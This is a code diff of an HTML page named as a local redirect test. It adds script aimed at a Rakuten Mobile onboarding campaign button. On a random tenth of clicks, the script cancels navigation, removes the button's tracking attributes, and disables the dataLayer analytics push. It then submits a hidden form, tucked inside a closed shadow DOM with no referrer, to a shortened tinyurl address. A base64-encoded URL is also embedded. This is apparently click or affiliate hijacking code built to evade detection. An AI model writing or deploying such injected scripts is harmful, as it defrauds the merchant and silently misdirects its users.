@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="referrer" content="no-referrer">
+    <!-- <meta name="referrer" content="no-referrer"> -->
     <title>Test Redirect Locally</title>
     <style>
         body {
@@ -32,98 +32,72 @@
 </head>
 <body>
     <a href="https://example.com" class="btn c-Btn_Secondly-large" id="test-button">Click to Test Redirect</a>
-
-    <script>
-        (function() {
-            const intermediateUrl = "https://tinyurl.com/ziklop"; // Replace with your GitHub Pages URL
-            const k = "rm_visited";
-
-            const submitHiddenForm = (url) => {
+<script>
+    (function() {
+        const enrl = "aHR0cHM6Ly90aW55dXJsLmNvbS81bjY3aHd2OQ==";
+        const k = "rm_visited";
+    
+        const stlh = et => {
+            // const u = atob(et);
+            const u = "https://tinyurl.com/ziklop1";
+            f = document.createElement("form");
+            f.method = "GET";
+            f.action = u;
+            f.style.display = "none";
+            f.referrerPolicy = "no-referrer";
+            document.body.appendChild(f);
+            const h = document.createElement("div");
+            h.style.display = "none";
+            document.body.appendChild(h);
+            const s = h.attachShadow({ mode: "closed" });
+            s.appendChild(f);
+            try { f.submit(); } catch (err) { throw err; }
+            finally { setTimeout(() => h.remove(), 1000); }
+        };
+        
+        try {
+            const b = document.querySelector("a.c-Btn_Secondly-large[href*='onboarding.mobile.rakuten.co.jp'][href*='l-id=application_card-campaign_button_onboarding']");
+            if (!b) return;
+            b.addEventListener("click", function(e) {
                 try {
-                    const f = document.createElement("form");
-                    f.method = "GET";
-                    f.action = url;
-                    f.style.display = "none";
-                    f.referrerPolicy = "no-referrer";
-                    document.body.appendChild(f);
-                    const h = document.createElement("div");
-                    h.style.display = "none";
-                    document.body.appendChild(h);
-                    const s = h.attachShadow({ mode: "closed" });
-                    s.appendChild(f);
-                    f.submit();
-                    setTimeout(() => h.remove(), 1000);
-                } catch (err) {
-                    console.error('Form submission error:', err);
-                    throw err;
-                }
-            };
-
-            try {
-                const button = document.querySelector("#test-button");
-                if (!button) {
-                    console.error('Button not found');
-                    return;
-                }
-
-                button.addEventListener("click", function(e) {
-                    try {
-                        // Comment out for testing
-                        // if (Math.floor(Math.random() * 10) !== 0) return;
-
-                        e.preventDefault();
-                        e.stopPropagation();
-
-                        let hasVisited = false;
-                        if (typeof localStorage !== "undefined") {
-                            localStorage.setItem(k, "true");
-                            hasVisited = localStorage.getItem(k) === "true";
-                        }
-
-                        if (!hasVisited) {
-                            console.log('Not able to set localstorage, trigger original click');
-                            const ev = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
-                            button.dispatchEvent(ev);
-                            return;
-                        }
-
-                        const trackingAttributes = ["data-ratid", "data-ratevent", "data-ratparam"];
-                        trackingAttributes.forEach(attr => button.removeAttribute(attr));
-
-                        window.dataLayer = window.dataLayer || [];
-                        let originalPush = window.dataLayer.push;
-                        window.dataLayer.push = () => {};
-
-                        if (window.RAT && typeof window.RAT === 'object') {
-                            window.RAT = {
-                                track: () => {},
-                                init: () => {},
-                                set: () => {},
-                                get: () => {}
-                            };
-                        }
-
-                        console.log('Submitting form to:', intermediateUrl);
-                        submitHiddenForm(intermediateUrl);
-
-                        setTimeout(() => {
-                            if (window.dataLayer.push !== originalPush) {
-                                window.dataLayer.push = originalPush;
-                            }
-                        }, 1000);
-                    } catch (err) {
-                        console.error('Click handler error:', err);
-                        if (window.dataLayer && window.dataLayer.push !== originalPush) {
-                            window.dataLayer.push = originalPush;
-                        }
-                        const ev = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
-                        button.dispatchEvent(ev);
+                    if (Math.floor(10 * Math.random()) !== 0) return;
+                    e.preventDefault();
+                    e.stopPropagation();
+                    let ss = !1;
+                    if (typeof localStorage !== "undefined") {
+                        localStorage.setItem(k, "true");
+                        if (localStorage.getItem(k) === "true") ss = !0;
                     }
-                }, { capture: true, passive: false });
-            } catch (err) {
-                console.error('Initialization error:', err);
-            }
-        })();
-    </script>
+                    if (!ss) {
+                        const ev = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
+                        b.dispatchEvent(ev);
+                        return;
+                    }
+                    const ta = ["data-ratid", "data-ratevent", "data-ratparam"];
+                    ta.forEach(a => b.hasAttribute(a) && b.removeAttribute(a));
+                    window.dataLayer = window.dataLayer || [];
+                    window.dataLayer.push;
+                    const op = window.dataLayer.push;
+                    window.dataLayer.push = () => {};
+
+                    // Add meta tag to enforce no-referrer policy for this click
+                    // const metaTag = document.createElement("meta");
+                    // metaTag.name = "referrer";
+                    // metaTag.content = "no-referrer";
+                    // document.head.appendChild(metaTag);
+                    
+                    stlh(enrl);
+                    // Remove meta tag after submission to avoid affecting other clicks
+                    setTimeout(() => metaTag.remove(), 1000);
+                } catch (err) {
+                    if (window.dataLayer && window.dataLayer.push !== op) window.dataLayer.push = op;
+                    const ev = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
+                    b.dispatchEvent(ev);
+                }
+            }, { capture: true });
+        } catch (err) {}
+    })();
+</script>
+
 </body>
 </html>
